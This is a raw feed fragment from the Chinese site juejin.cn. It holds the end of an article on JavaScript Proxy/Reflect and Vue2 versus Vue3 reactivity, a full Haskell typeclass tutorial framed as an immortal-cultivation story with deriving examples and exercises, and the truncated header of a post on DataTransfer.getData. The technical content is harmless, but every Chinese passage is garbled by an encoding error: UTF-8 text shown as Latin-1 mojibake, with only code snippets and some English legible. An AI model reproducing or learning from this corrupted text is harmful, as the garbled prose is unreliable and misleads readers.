<p><strong>Reflect</strong>ï¼šå’Œ Proxy æ­æ¡£ï¼Œæ›´å®‰å…¨åœ°æ“ä½œå¯¹è±¡å±æ€§ï¼ˆæ›¿ä»£Â <code>target[property]</code>Â å’ŒÂ <code>target[property] = value</code>ï¼‰ã€‚</p>
</li>
<li>
<p><strong>æ ¸å¿ƒæµç¨‹</strong>ï¼š</p>
<ul>
<li>ç”¨Â <code>makeReactive</code>Â å‡½æ•°æŠŠæ™®é€šå¯¹è±¡å˜æˆ Proxy ä»£ç†å¯¹è±¡</li>
<li>æ“ä½œä»£ç†å¯¹è±¡æ—¶ï¼Œä¼šè§¦å‘ get/set æ‹¦æˆªå™¨</li>
<li>åœ¨ set æ‹¦æˆªå™¨ä¸­ï¼Œæ•°æ®ä¿®æ”¹åè‡ªåŠ¨æ‰§è¡Œ DOM æ›´æ–°ï¼ˆæˆ–å…¶ä»–é€»è¾‘ï¼‰</li>
</ul>
</li>
<li>
<p><strong>å…³é”®æ³¨æ„ç‚¹</strong>ï¼šå¿…é¡»æ“ä½œã€ŒProxy ä»£ç†å¯¹è±¡ã€æ‰ä¼šè§¦å‘å“åº”å¼ï¼Œæ“ä½œåŸå§‹å¯¹è±¡æ— æ•ˆã€‚</p>
</li>
</ol>
<h2 data-id="heading-13">äº”ã€å¸¸è§ç–‘é—®è§£ç­”</h2>
<ol>
<li><strong>é—®ï¼šä¸ºä»€ä¹ˆä¸ç”¨ç›´æ¥ä¿®æ”¹å¯¹è±¡ï¼Œéè¦ç”¨ Proxyï¼Ÿ</strong> ç­”ï¼šç›´æ¥ä¿®æ”¹å¯¹è±¡æ— æ³• â€œç›‘å¬â€ å˜åŒ–ï¼Œæ¯”å¦‚Â <code>user.level = 2</code>ï¼Œæˆ‘ä»¬ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™æ”¹çš„ã€æ”¹äº†ä»€ä¹ˆå€¼ï¼›è€Œ Proxy èƒ½ç²¾å‡†æ•è·è¿™äº›æ“ä½œï¼Œè¿›è€Œè§¦å‘åç»­é€»è¾‘ã€‚</li>
<li><strong>é—®ï¼šè¿™å’Œ Vue3 çš„å“åº”å¼æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ</strong> ç­”ï¼šVue3 çš„Â <code>reactive</code>Â å‡½æ•°åº•å±‚å°±æ˜¯åŸºäº Proxy å®ç°çš„ï¼Œæˆ‘ä»¬å†™çš„Â <code>makeReactive</code>Â å°±æ˜¯Â <code>reactive</code>Â çš„ç®€åŒ–ç‰ˆï¼ŒVue3 åªæ˜¯åœ¨è¿™ä¸ªåŸºç¡€ä¸Šå¢åŠ äº† â€œä¾èµ–æ”¶é›†â€ ç­‰æ›´å¤æ‚çš„é€»è¾‘ï¼ˆä¸‹ä¸€ç¯‡æ–‡ç« å¯èƒ½å°±ä¼šè®²è¿°ï¼Œå¤§å®¶å¯ä»¥å…³æ³¨æ–°çš„æ ç›®"Vueæºç è§£æ"ï¼‰ã€‚</li>
<li><strong>é—®ï¼šReflect å¿…é¡»ç”¨å—ï¼Ÿä¸ç”¨è¡Œä¸è¡Œï¼Ÿ</strong> ç­”ï¼šç®€å•åœºæ™¯ä¸‹ä¸ç”¨ä¹Ÿå¯ä»¥ï¼Œä½† Reflect èƒ½è§£å†³å¾ˆå¤šå‘ï¼ˆæ¯”å¦‚ç»§æ‰¿ã€ä¸¥æ ¼æ¨¡å¼ï¼‰ï¼Œè€Œä¸”æ˜¯ ES6 æ¨èçš„ Proxy æ­æ¡£ï¼Œæ–°æ‰‹ç›´æ¥å…»æˆä½¿ç”¨ä¹ æƒ¯å³å¯ã€‚</li>
</ol>
<h2 data-id="heading-14">å…­ã€æ‹“å±•</h2>
<p>æ—¢ç„¶éƒ½è®²åˆ°è¿™é‡Œå•¦ï¼Œé‚£å°±æµ…è°ˆvue2å’Œvue3ä¸­å…³äºæœ‰æ— Proxyçš„åŒºåˆ«å§~</p>
<h3 data-id="heading-15">1. Vue2 çš„å“åº”å¼ï¼šåŸºäºÂ <code>Object.defineProperty</code></h3>
<p>Vue2 æ˜¯é€šè¿‡Â <code>Object.defineProperty</code>Â ç»™å¯¹è±¡çš„<strong>æ¯ä¸ªå±æ€§</strong>å•ç‹¬è®¾ç½®Â <code>getter/setter</code>ï¼Œä»è€Œç›‘å¬å±æ€§çš„è¯»å†™ã€‚</p>
<p>ä½†å®ƒæœ‰å‡ ä¸ªæ˜æ˜¾çš„<strong>ç¼ºé™·</strong>ï¼š</p>
<ul>
<li>åªèƒ½ç›‘å¬<strong>å·²å­˜åœ¨çš„å±æ€§</strong>ï¼šå¦‚æœç»™å¯¹è±¡æ–°å¢å±æ€§ï¼ˆæ¯”å¦‚Â <code>obj.newKey = 1</code>ï¼‰ï¼ŒVue2 ç›‘å¬ä¸åˆ°ï¼Œå¾—ç”¨Â <code>Vue.set</code>Â æ‰‹åŠ¨è§¦å‘å“åº”ã€‚</li>
<li>æ— æ³•ç›‘å¬<strong>æ•°ç»„çš„å˜åŒ–</strong>ï¼šæ¯”å¦‚æ•°ç»„çš„Â <code>push/pop/splice</code>Â ç­‰æ–¹æ³•ï¼ŒVue2 æ˜¯é€šè¿‡ â€œé‡å†™æ•°ç»„åŸå‹æ–¹æ³•â€ çš„æ–¹å¼æ›²çº¿æ•‘å›½ï¼Œä¸å¤Ÿä¼˜é›…ã€‚</li>
<li>å¿…é¡»éå†å¯¹è±¡çš„æ‰€æœ‰å±æ€§ï¼šå¦‚æœå¯¹è±¡å±‚çº§æ·±ï¼Œéœ€è¦é€’å½’éå†ï¼Œæ€§èƒ½å¼€é”€å¤§ã€‚</li>
</ul>
<h3 data-id="heading-16">2. Vue3 çš„å“åº”å¼ï¼šåŸºäºÂ <code>Proxy</code></h3>
<p>Vue3 ç”¨Â <code>Proxy</code>Â ä»£ç†<strong>æ•´ä¸ªå¯¹è±¡</strong>ï¼Œç›´æ¥æ‹¦æˆªå¯¹è±¡çš„ã€Œæ‰€æœ‰å±æ€§æ“ä½œã€ï¼Œå®Œç¾è§£å†³äº† Vue2 çš„ç¼ºé™·ï¼š</p>
<ul>
<li>èƒ½ç›‘å¬<strong>æ–°å¢ / åˆ é™¤å±æ€§</strong>ï¼šæ¯”å¦‚Â <code>obj.newKey = 1</code>Â ä¼šè¢«Â <code>Proxy</code>Â çš„Â <code>set</code>Â æ‹¦æˆªï¼Œè‡ªåŠ¨å“åº”ã€‚</li>
<li>èƒ½åŸç”Ÿç›‘å¬<strong>æ•°ç»„å˜åŒ–</strong>ï¼šæ•°ç»„çš„Â <code>push/pop</code>Â ç­‰æ“ä½œä¼šè¢«Â <code>Proxy</code>Â æ•è·ï¼Œä¸ç”¨å†é‡å†™æ•°ç»„æ–¹æ³•ã€‚</li>
<li>ä»£ç†æ•´ä¸ªå¯¹è±¡ï¼Œæ— éœ€é€’å½’éå†ï¼š<code>Proxy</code>Â æ˜¯ä»£ç†æ•´ä¸ªå¯¹è±¡ï¼Œå±‚çº§æ·±çš„å¯¹è±¡ä¼šåœ¨<strong>è¯»å–æ—¶æ‡’ä»£ç†</strong>ï¼Œæ€§èƒ½æ›´ä¼˜ã€‚</li>
</ul>
<h3 data-id="heading-17">æ€»ç»“</h3>
<p>Vue3 ç”¨Â <code>Proxy</code>Â æ›¿ä»£ Vue2 çš„Â <code>Object.defineProperty</code>ï¼Œæœ¬è´¨æ˜¯<strong>ç”¨æ›´ç°ä»£ã€æ›´å¼ºå¤§çš„ ES6 ç‰¹æ€§ï¼Œè§£å†³äº† Vue2 å“åº”å¼çš„å„ç§ â€œç—›ç‚¹â€</strong> ~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬å››ç« ï¼šå¤©é“ä½æ ¼ä¸è¯¸æ³•å¥‘çº¦]]></title>    <link>https://juejin.cn/post/7589206614928982056</link>    <guid>https://juejin.cn/post/7589206614928982056</guid>    <pubDate>2025-12-30T01:48:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589206614928982056" data-draft-id="7589207843787210787" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬å››ç« ï¼šå¤©é“ä½æ ¼ä¸è¯¸æ³•å¥‘çº¦"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T01:48:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬å››ç« ï¼šå¤©é“ä½æ ¼ä¸è¯¸æ³•å¥‘çº¦
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T01:48:49.000Z" title="Tue Dec 30 2025 01:48:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ­å–œé“å‹ï¼ä½ å·²å®Œæˆç­‘åŸºï¼Œæ°”æµ·å……ç›ˆï¼Œæ³•å®ç†Ÿç»ƒã€‚ç°åœ¨ï¼Œæˆ‘ä»¬è¦è¿ˆå…¥ä¿®ä»™è·¯ä¸Šçš„ä¸€ä¸ªå…³é”®è½¬æŠ˜ç‚¹â€”â€”<strong>ç»“ä¸¹æœŸ</strong>ã€‚</p>
<p>åœ¨è¿™ä¸€ç« ï¼Œä½ å°†é¢†æ‚Ÿ Haskell çš„**â€œå¤©é“æˆä½â€ç³»ç»Ÿï¼šTypeclassesï¼ˆç±»å‹ç±»ï¼‰**ã€‚è¿™å†³å®šäº†ä½ çš„ç±»å‹ï¼ˆçµæ ¹ï¼‰åœ¨å®‡å®™æ³•åˆ™ä¸­ç©¶ç«Ÿæ‹¥æœ‰ä½•ç§â€œç‰¹æƒâ€ã€‚</p>
<hr/>
<p>åœ¨å‡¡é—´çš„é¢å‘å¯¹è±¡å®—é—¨ï¼ˆå¦‚ Javaã€C++ï¼‰ï¼Œäººä»¬é€šè¿‡â€œç»§æ‰¿â€æ¥è·å¾—èƒ½åŠ›ï¼Œè¿™å¾€å¾€å¯¼è‡´è¡€è„‰æ··ä¹±ï¼ˆç±»å±‚çº§è¿‡äºå¤æ‚ï¼‰ã€‚è€Œ Î» é—¨çš„è§„çŸ©æ˜¯ï¼š <strong>â€œä¸çœ‹å‡ºèº«ï¼Œåªçœ‹ä½æ ¼ã€‚â€</strong></p>
<h3 data-id="heading-0">4.1 ä»€ä¹ˆæ˜¯ Typeclassï¼Ÿ</h3>
<p><strong>Typeclass</strong> å¹¶ä¸æ˜¯ç±»ï¼Œè€Œæ˜¯ä¸€ä»½**â€œå¥‘çº¦â€<strong>æˆ–</strong>â€œä½æ ¼â€**ã€‚å¦‚æœä¸€ä¸ªç±»å‹ï¼ˆTypeï¼‰è·å¾—äº†æŸç§ä½æ ¼ï¼Œå®ƒå°±å¿…é¡»æŒæ¡è¯¥ä½æ ¼è¦æ±‚çš„â€œç¥é€šâ€ã€‚</p>
<ul>
<li><strong>Eqï¼ˆè¾¨çœŸä½ï¼‰ï¼š</strong> è·å¾—æ­¤ä½æ ¼ï¼Œä¾¿å¯ä½¿ç”¨ <code>==</code> å’Œ <code>/=</code>ï¼Œè¾¨åˆ«ä¸¤ä¸ªæ³•å®æ˜¯å¦ç›¸åŒã€‚</li>
<li><strong>Ordï¼ˆäº‰èƒœä½ï¼‰ï¼š</strong> è·å¾—æ­¤ä½æ ¼ï¼Œæ„å‘³ç€å¯ä»¥æ¯”è¾ƒé«˜ä¸‹ï¼ˆ<code>&lt;</code>, <code>&gt;</code>, <code>compare</code>ï¼‰ã€‚</li>
<li><strong>Showï¼ˆæ˜¾åœ£ä½ï¼‰ï¼š</strong> è·å¾—æ­¤ä½æ ¼ï¼Œç±»å‹ä¾¿èƒ½åŒ–è™šä¸ºå®ï¼Œè½¬åŒ–ä¸º <code>String</code> æ‰“å°å‡ºæ¥ã€‚</li>
<li><strong>Numï¼ˆæœ¯æ•°ä½ï¼‰ï¼š</strong> è·å¾—æ­¤ä½æ ¼ï¼Œè¯¥ç±»å‹ä¾¿å…·å¤‡äº†æ•°å­¦å±æ€§ï¼Œå¯è¿›è¡ŒåŠ å‡ä¹˜é™¤ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-1">4.2 æ••å°ä½æ ¼ï¼šDerivingï¼ˆå¤©é“æ••ä»¤ï¼‰</h3>
<p>åœ¨ Haskell ä¸­ï¼Œæœ€å¿«æ·çš„ç»“ä¸¹æ–¹å¼å°±æ˜¯ä½¿ç”¨ <code>deriving</code>ã€‚å½“ä½ å®šä¹‰ä¸€ä¸ªæ–°çš„æ•°æ®ç»“æ„ï¼ˆData Typeï¼‰æ—¶ï¼Œå¯ä»¥ç›´æ¥å‘å¤©é“ç”³è¯·ä½æ ¼ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼šç‚¼åˆ¶ä¸€æšâ€œçµä¸¹â€</strong></p>
<p>Haskell</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- å®šä¹‰ä¸€ä¸ªâ€œçµä¸¹â€ç±»å‹</span>
data SpiritPill <span class="hljs-operator">=</span> LowGrade <span class="hljs-operator">|</span> MidGrade <span class="hljs-operator">|</span> HighGrade
    deriving (Eq, Ord, <span class="hljs-keyword">Show</span>) <span class="hljs-comment">-- è‡ªåŠ¨è·å¾—è¾¨åˆ«ã€æ’åºã€æ˜¾ç¤ºçš„èƒ½åŠ›</span>
</code></pre>
<p><strong>æ³•åŠ›æ¼”ç¤ºï¼š</strong></p>
<ul>
<li><strong>æ˜¾åœ£ï¼š</strong> <code>show LowGrade</code> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â†’</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">â†’</span></span></span></span></span> <code>"LowGrade"</code></li>
<li><strong>äº‰èƒœï¼š</strong> <code>HighGrade &gt; LowGrade</code> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â†’</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">â†’</span></span></span></span></span> <code>True</code>ï¼ˆåœ¨ <code>deriving</code> ä¸­ï¼Œåå®šä¹‰çš„é€šå¸¸æ¯”å…ˆå®šä¹‰çš„é«˜çº§ï¼‰</li>
<li><strong>è¾¨çœŸï¼š</strong> <code>MidGrade == MidGrade</code> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â†’</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">â†’</span></span></span></span></span> <code>True</code></li>
</ul>
<hr/>
<h3 data-id="heading-2">4.3 å¥‘çº¦çº¦æŸï¼šç±»å‹çº¦æŸï¼ˆType Constraintsï¼‰</h3>
<p>å½“ä½ å†™ä¸€ä¸ªé€šç”¨çš„æ³•æœ¯æ—¶ï¼Œä½ å¯èƒ½éœ€è¦è¦æ±‚è¾“å…¥è€…å¿…é¡»æ‹¥æœ‰æŸç§â€œä½æ ¼â€ã€‚</p>
<p>ç¤ºä¾‹ï¼šæ–—æ³•å‡½æ•°</p>
<p>ä½ æƒ³å†™ä¸€ä¸ªæ³•æœ¯ï¼Œæ¯”è¾ƒä¸¤ä¸ªä¸œè¥¿çš„å¼ºå¼±ï¼Œå¹¶å®£å¸ƒèƒœè€…ã€‚è¿™è¦æ±‚è¾“å…¥çš„ä¸œè¥¿å¿…é¡»æ‹¥æœ‰ Ordï¼ˆèƒ½æ¯”å¤§å°ï¼‰å’Œ Showï¼ˆèƒ½æ‰“å°ï¼‰è¿™ä¸¤ä¸ªä½æ ¼ã€‚</p>
<p>Haskell</p>
<pre><code class="hljs language-rust" lang="rust">battle :: (<span class="hljs-built_in">Ord</span> a, Show a) =&gt; a <span class="hljs-punctuation">-&gt;</span> a <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span>
battle x y = 
    <span class="hljs-keyword">if</span> x &gt; y 
    then show x ++ <span class="hljs-string">" èƒœå‡ºï¼"</span> 
    <span class="hljs-keyword">else</span> show y ++ <span class="hljs-string">" èƒœå‡ºï¼"</span>
</code></pre>
<blockquote>
<p><strong>è§£æï¼š</strong> <code>(Ord a, Show a) =&gt;</code> ä¾¿æ˜¯**â€œå¥‘çº¦å‰æâ€**ã€‚åªæœ‰æ»¡è¶³è¿™ä¸¤æ¡è§„åˆ™çš„ç±»å‹ <code>a</code>ï¼Œæ‰æœ‰èµ„æ ¼è¿›å…¥è¿™ä¸ªæ³•é˜µã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-3">4.4 è‡ªåˆ›å¥‘çº¦ï¼šè‡ªå®šä¹‰ Typeclass</h3>
<p>å¦‚æœä½ æ˜¯å®—é—¨é•¿è€ï¼Œä½ ä¹Ÿå¯ä»¥è‡ªåˆ›ä¸€ä»½å¥‘çº¦ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼šå®šä¹‰â€œä¿®è¡Œâ€ä½æ ¼</strong></p>
<p>Haskell</p>
<pre><code class="hljs language-rust" lang="rust">class Practicable a <span class="hljs-keyword">where</span>
    practice :: a <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span>  -- å‡¡æ˜¯èƒ½ä¿®è¡Œçš„ï¼Œéƒ½å¿…é¡»æœ‰ practice è¿™ä¸ªåŠ¨ä½œ
</code></pre>
<p>è®©ä¸åŒçš„çµæ ¹å®ç°è¿™ä¸ªä½æ ¼ï¼š</p>
<p>Haskell</p>
<pre><code class="hljs language-ini" lang="ini">instance Practicable SpiritPill where
    practice <span class="hljs-attr">HighGrade</span> = <span class="hljs-string">"è¯æ•ˆæƒŠäººï¼Œä¿®ä¸ºä¸€æ—¥åƒé‡Œï¼"</span>
    practice <span class="hljs-attr">_</span>         = <span class="hljs-string">"è¯æ•ˆå°šå¯ï¼Œéœ€å‹¤åŠ ä¿®ç‚¼ã€‚"</span>
</code></pre>
<hr/>
<h2 data-id="heading-4">âš¡ ç»“ä¸¹å¿ƒå¾—ï¼šæŠ½è±¡çš„åŠ›é‡</h2>
<p>å½“ä½ æŒæ¡äº† Typeclassesï¼Œä½ å†™çš„ä»£ç å°†ä¸å†å±€é™äºå…·ä½“çš„æ•°å­—æˆ–å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ä¸“æ³¨äº**â€œè¡Œä¸ºçš„æœ¬è´¨â€**ã€‚ä½ å¯ä»¥å†™ä¸€ä¸ªå¤„ç†â€œæ‰€æœ‰å¯ä»¥æ’åºçš„ä¸œè¥¿â€çš„ç®—æ³•ï¼Œè€Œä¸å¿…åœ¨ä¹å®ƒæ˜¯çµçŸ³ã€é£å‰‘è¿˜æ˜¯é“å·ã€‚</p>
<hr/>
<h2 data-id="heading-5">ğŸ“œ ç»“ä¸¹è¯•ç‚¼ï¼šç¬¬å››å…³</h2>
<p>ç°åœ¨ï¼Œè¯·æ–½å±•ä½ çš„â€œå¤©é“æˆä½â€ç¥é€šï¼š</p>
<ol>
<li><strong>å®šä¹‰æ–°å¢ƒç•Œï¼š</strong> å®šä¹‰ä¸€ä¸ªæ•°æ®ç±»å‹ <code>Rank</code>ï¼ŒåŒ…å« <code>ZhuJi</code> (ç­‘åŸº), <code>JinDan</code> (é‡‘ä¸¹), <code>YuanYing</code> (å…ƒå©´)ã€‚</li>
<li><strong>èµ‹äºˆä½æ ¼ï¼š</strong> è®© <code>Rank</code> æ‹¥æœ‰ <code>Eq</code>, <code>Show</code> å’Œ <code>Ord</code> ä½æ ¼ã€‚</li>
<li><strong>éªŒè¯ï¼š</strong> å°è¯•åœ¨ <code>ghci</code> ä¸­è¿è¡Œ <code>JinDan &gt; ZhuJi</code> ä»¥åŠ <code>show YuanYing</code>ã€‚</li>
<li><strong>è¿›é˜¶ï¼ˆå¯é€‰ï¼‰ï¼š</strong> å°è¯•æ‰‹å†™ä¸€ä¸ª <code>instance Eq Rank where</code>ï¼Œè®© <code>ZhuJi</code> å’Œä»»ä½•å¢ƒç•Œéƒ½â€œä¸ç›¸ç­‰â€ï¼ˆå³ä½¿æ˜¯ä¸¤ä¸ªç­‘åŸºä¹Ÿä¸ç›¸ç­‰ï¼Œè±¡å¾ä¿®ä»™ä¹‹è·¯å”¯æœ‰è‡ªçŸ¥ï¼‰ã€‚</li>
</ol>
<p><strong>â€œä½æ ¼å·²å®šï¼Œé‡‘ä¸¹åˆæˆã€‚ä»æ­¤ä»¥åï¼Œä½ çœ¼ä¸­çš„æ•°æ®ä¸å†æ˜¯æ­»ç‰©ï¼Œè€Œæ˜¯èƒŒè´Ÿç€å¥‘çº¦ä¸ä½¿å‘½çš„çµä½“ã€‚â€</strong></p>
<hr/>
<p><strong>ä¸‹ä¸€ç« é¢„å‘Šï¼š</strong> ç»ˆäºè¦è¿æ¥ä¿®ä»™ç•Œæœ€å¤§çš„é›·åŠ«ï¼Œä¹Ÿæ˜¯ Haskell åŠ›é‡çš„ç»ˆæä½“ç°â€”â€”<strong>Monadï¼ˆå•å­ï¼‰</strong> ã€‚ä¸è¦å®³æ€•ï¼Œå®ƒå…¶å®åªæ˜¯ä¸€ä¸ªå¸¦ç€â€œç‰¹æ®Šç¯å¢ƒâ€çš„ç›’å­ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è®°ä¸€æ¬¡å‘ç° DataTransfer çš„ getData çš„æœ‰è¶£é—®é¢˜]]></title>    <link>https://juejin.cn/post/7588934987511087131</link>    <guid>https://juejin.cn/post/7588934987511087131</guid>    <pubDate>2025-12-29T13:23:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588934987511087131" data-draft-id="7589107312112713737" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è®°ä¸€æ¬¡å‘ç° DataTransfer çš„ getData çš„æœ‰è¶£é—®é¢˜"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T13:23:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HabaraAi"/> <meta itemprop="url" content="https://juejin.cn/user/2066737588871287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" 